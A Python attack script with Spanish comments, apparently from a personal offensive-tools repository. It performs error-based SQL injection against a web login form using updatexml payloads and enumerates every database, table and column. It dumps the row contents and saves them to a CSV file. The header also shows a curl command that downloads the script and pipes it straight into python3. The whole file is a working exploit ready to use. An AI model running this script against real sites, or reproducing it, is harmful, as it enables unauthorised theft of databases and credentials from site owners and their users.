#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para Dumpear las bases de datos de un servidor web atacando el formulario de login con la vulnerabilidad error based
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/SQLi/DumpearBasesDeDatos-ConVulnErrorBased.py | python3 - Parámetro1 Parámetro2
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/SQLi/DumpearBasesDeDatos-ConVulnErrorBased.py | nano -
#
# Requisitos: # python3 -m pip install --user x --break-system-packages
#
# ----------

import requests
import argparse
import csv
from urllib.parse import urlparse

# Argumentos CLI
parser = argparse.ArgumentParser(description="Dump SQL vía SQLi (updatexml), formato estructurado y exportación CSV.")
parser.add_argument("--url", required=True, help="URL del formulario vulnerable, ej: http://10.10.224.12/login")
parser.add_argument("--max", type=int, default=10, help="Máximo de iteraciones por nivel (default: 10)")
parser.add_argument("--userfield", default="username", help="Nombre del campo de usuario en el formulario (default: username)")
parser.add_argument("--passfield", default="password", help="Nombre del campo de contraseña en el formulario (default: password)")
args = parser.parse_args()

url = args.url
max_enum = args.max
user_field = args.userfield
pass_field = args.passfield
dump = {}

headers = {
  "User-Agent": "Mozilla/5.0",
  "Content-Type": "application/x-www-form-urlencoded"
}

def sqli_payload(query):
  return f"' AND updatexml(null,concat(0x7e,({query}),0x7e),null) -- -"

def extract(query):
  try:
    data = {user_field: sqli_payload(query), pass_field: "x"}
    r = requests.post(url, data=data, headers=headers, timeout=5)
    if "XPATH syntax error" in r.text:
      start = r.text.find("~")
      end = r.text.find("~", start + 1)
      if start != -1 and end != -1:
        return r.text[start + 1:end]
  except Exception as e:
    print(f"[!] Error durante la petición: {e}")
  return None

print("\n Iniciando dumpeo SQLi con updatexml...\n")

for db_i in range(max_enum):
  db = extract(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
  if not db:
    print(f"No hay más bases de datos en offset {db_i}")
    break
  print(f"📁 Base de datos encontrada: {db}")
  dump[db] = {}

  for tb_i in range(max_enum):
    table = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {tb_i},1")
    if not table:
      print(f"   └─ No hay más tablas en {db} (offset {tb_i})")
      break
    print(f"  Tabla: {table}")
    dump[db][table] = {}

    for col_i in range(max_enum):
      column = extract(f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}' LIMIT {col_i},1")
      if not column:
        print(f"     └─ No hay más columnas en {db}.{table} (offset {col_i})")
        break
      print(f"    Columna: {column}")
      dump[db][table][column] = []

      for row_i in range(max_enum):
        value = extract(f"SELECT {column} FROM {db}.{table} LIMIT {row_i},1")
        if value is None:
          if row_i == 0:
            print(f"       └─ Sin datos en esta columna.")
          break
        print(f"      row[{row_i}]: {value}")
        dump[db][table][column].append(value)

# Mostrar resumen final
print("\n Resumen final del dumpeo:\n")

for db, tables in dump.items():
  print(f"{db}")
  for table, columns in tables.items():
    print(f"  {table}")
    for column, values in columns.items():
      print(f"    {column}")
      for idx, val in enumerate(values):
        print(f"      row[{idx}]: {val}")

# Guardar en CSV
hostname = urlparse(url).hostname.replace(".", "_")
csv_file = f"dump_{hostname}.csv"
with open(csv_file, "w", newline='', encoding="utf-8") as f:
  writer = csv.writer(f)
  writer.writerow(["Database", "Table", "Column", "RowIndex", "Value"])
  for db, tables in dump.items():
    for table, columns in tables.items():
      for column, values in columns.items():
        for idx, val in enumerate(values):
          writer.writerow([db, table, column, idx, val])

print(f"\n Dump guardado en CSV: {csv_file}")

